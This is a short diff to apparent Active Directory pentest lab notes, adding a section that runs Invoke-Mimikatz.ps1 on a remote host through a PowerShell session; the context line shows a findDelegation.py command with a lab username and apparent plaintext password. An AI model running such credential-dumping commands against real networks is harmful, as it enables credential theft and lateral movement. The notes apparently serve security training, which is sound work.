@@ -164,7 +164,11 @@ python3 findDelegation.py dollarcorp.moneycorp.local/student202:t3dBtZYM4dWh5iKM
 # BloodHound
 
 coming ...
-
+  
+# Load script through PSSESSION
+```
+Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
+```
 
 --------------------------------------------------------------
 
